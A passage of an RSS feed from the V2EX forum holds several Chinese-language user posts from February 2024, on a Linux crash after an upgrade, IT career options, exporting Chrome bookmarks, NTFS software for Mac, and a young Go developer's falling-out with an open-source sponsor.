我瞬间信了。&lt;/p&gt;</description><pubDate>Fri, 16 Feb 2024 17:43:02 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015931#reply16</guid></item><item><title>[Linux] 系统崩溃</title><link>https://www.v2ex.com/t/1015930#reply1</link><description>apt upgrade 以后，不定时系统崩溃，能看出原因吗？&lt;br /&gt;&lt;br /&gt;&lt;a href="https://i.imgur.com/ghLjbNl.jpeg" rel="nofollow noopener" target="_blank"&gt;&lt;img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/ghLjbNl.jpeg" /&gt;&lt;/a&gt;</description><pubDate>Fri, 16 Feb 2024 17:28:36 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015930#reply1</guid></item><item><title>[问与答] 看了几个国内外 IT 求职的帖子，讨论下到底有没有蓝海职业呢</title><link>https://www.v2ex.com/t/1015929#reply4</link><description>&lt;p&gt;国内外 it 行业投简历与职位比，貌似都超过 100 比 1 ，红海&lt;/p&gt;
&lt;p&gt;那是否有新的蓝海职业，值得我们现在转向掉头呢？&lt;/p&gt;
&lt;p&gt;想听听大家的认识与见解&lt;/p&gt;</description><pubDate>Fri, 16 Feb 2024 17:23:17 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015929#reply4</guid></item><item><title>[Android] 手机版 Chrome 有没有办法导出书签</title><link>https://www.v2ex.com/t/1015928#reply1</link><description>在不登陆 Google 的情况下</description><pubDate>Fri, 16 Feb 2024 16:36:55 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015928#reply1</guid></item><item><title>[Apple] 新人求助： Mac 读取 NTFS 格式软件购买推荐及答疑</title><link>https://www.v2ex.com/t/1015927#reply17</link><description>&lt;h3&gt;背景信息&lt;/h3&gt;
&lt;p&gt;近期我购买了 2t 的移动硬盘，因为后续还有连接 Windows 平台使用的需求，为方便 Mac 和 Windows 共同使用（出于数据安全性需要 Exfat 没有考虑），我将硬盘设置为来 NTFS 格式。&lt;/p&gt;
&lt;h3&gt;软件选择&lt;/h3&gt;
&lt;p&gt;目前锚定了 Paragon 和 Tuxera 的软件，楼主在购买选择读取软件时候犯了一些困难。&lt;/p&gt;
&lt;h3&gt;购买疑惑&lt;/h3&gt;
&lt;p&gt;关于 Paragon 的软件有以下两点疑惑：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;关于授权模式：&lt;/strong&gt;我在试用 Paragon 的 NTFS for Mac ，感觉还不错准备付费，发现是版本授权，后续更新大版本还需再付费，想问问大佬们是否是需要一个版本一付费的才能使用？&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关于购买渠道：&lt;/strong&gt;我发现购买渠道是官网（美元/信用卡付费），或者买中国代理公司的，或者一些第三方平台的，我对后两个比较疑惑不知道是什么样的存在？不知道是否靠谱？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;关于 Tuxera 的软件有以下两点疑惑：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;关于授权模式：&lt;/strong&gt;Tuxera 版本也是一版本一付费还是终身授权呢？&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关于购买渠道：&lt;/strong&gt;我查询到有官网（美元等）、第三方平台、或者上淘宝（甚至有 10 元的 tuxera ，这靠谱吗？）不知道哪个渠道靠谱？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;同时我也想了解一下大家对于 Mac 端 NTFS 格式软件使用的看法和选取建议，十分感谢。感谢大佬们！第一次发帖如有问题多多海涵。&lt;/p&gt;</description><pubDate>Fri, 16 Feb 2024 16:29:49 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015927#reply17</guid></item><item><title>[Go 编程语言] 求助,请各路大神指点指点我的未来吧...</title><link>https://www.v2ex.com/t/1015926#reply4</link><description>&lt;h2&gt;背景&lt;/h2&gt;
&lt;p&gt;我是个去年大专毕业的, 今年是 22 岁.&lt;/p&gt;
&lt;p&gt;哎, 当时轻视了专转本的难度, 直接就没考上. 说句实话也是个废物.&lt;/p&gt;
&lt;p&gt;我个人的后面的打算是光速考个自考本科, 然后去考研, 家里并不急着我工作.&lt;/p&gt;
&lt;p&gt;我甚至还写 go, 那没学历更完蛋了. 有段时间我甚至想去开地铁, 因为它上二休二, 时间很多, 毕竟自考一般是工作之余准备的嘛, 可惜种种原因, 我在产生这个念头的时候, 就已经错过这个机会 4 个月了, 艹.&lt;/p&gt;
&lt;p&gt;于是我就在学习之余, 参与参与开源, 就当放松身心了.&lt;/p&gt;
&lt;p&gt;中间认识了一个开源组织的人, 其实抛开后文对我不错, 比如他看我一直吐槽我自己的 pc (我家就一句话: &lt;code&gt;买那么多电脑吃吗? 又不是不能用&lt;/code&gt;), 于是他把他自己的空余 mac 借给我用了. &lt;/p&gt;
&lt;p&gt;后文的给钱的活动也是他喊我来的.&lt;/p&gt;
&lt;h2&gt;经历&lt;/h2&gt;
&lt;p&gt;大概是这样的, 我之前和某个开源组织里达成了一个约定. 大概是他会安排大概 &lt;strong&gt;3 个月&lt;/strong&gt; 左右的一个目标, 如果我按照这个目标完成的话, 会分阶段给我付钱啊.&lt;/p&gt;
&lt;p&gt;但是从一开始, 我设立的所谓目标在他们的要求变了很多次. &lt;/p&gt;
&lt;p&gt;比如刚开始的目标和 go ast 相关, 需要我通过分析 ast 的方式改造代码(但是后面他们觉得不太现实, 毕竟我要改造的规模恒大, 就让我放弃了). &lt;/p&gt;
&lt;p&gt;后面改成给项目添加一系列测试来保证核心功能不会在迭代的时候出现无法预知的大的劣化(结果做着做着他们说人太忙了没人管这个这个有没有干).&lt;/p&gt;
&lt;p&gt;于是时间渐渐的来到了春节期间, 他们又给我换目标了. 这次改为通过分析 api 路由, 删除对应的相关的 handler 代码. &lt;/p&gt;
&lt;p&gt;大概就是存在 &lt;code&gt;/v1/api&lt;/code&gt; 这么个 api, 指定后将 handler 本身以及删去 handler 后产生的 unused code 全删了. &lt;/p&gt;
&lt;p&gt;我完成了删去 router 的部分, 但是我后面的要求完不成啊. 我记得 lol 里不是经常出现装备移除了代码还在的情况吗? 人家拳头是大公司吧, 他们也没解决这种 unused code 问题啊. 我就和他们那边手后面做不到, 毕竟对我的脑袋来说做不到.&lt;/p&gt;
&lt;p&gt;然后他们那边就急了, 说不就是这样才需要我吗? 正值春节啊, 我干嘛加班加点忙一个在我眼里根本完不成的事儿呢? 当时我就急眼了. 用我的话来说我恶心了他一下, 因为他说他很忙, 我就一直和他说办不成. 最后直接给我拉黑了, 说不需要我了, 后面把钱一并结给我.&lt;/p&gt;
&lt;h2&gt;困惑&lt;/h2&gt;
&lt;p&gt;其实这之后我就在思考一件事, 前提是他会一个月给我发 3k.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;一方面我觉得我做的这个事情的难度好像远超这个价格; 另一方面我要是嫌少, 他一毛不给又能怎么样呢, 有就不错了.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这段过年的催促让我感觉我的开源变得并不快乐了, 就好像我在给他打工. 他大概没料想到我是个急了直接开摆的人, 现在他的进度直接结束了, 直接来个双输.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;所以在这件事之后, 我还应该和这边的开源组织联系吗? 说老实话恶心的我 go 都不太想写了. 我现在的态度就是继续学习, 也别开什么源了, 打游戏算了.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我之后该怎么办呢.....&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这是我第一次在互联网上求助, 因为附近真找不到什么人能理解发生了什么事情了, 求求各位给我一些建议, 拜托了&lt;/p&gt;
&lt;/blockquote&gt;</description><pubDate>Fri, 16 Feb 2024 16:24:18 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015926#reply4</guid></item></channel></rss>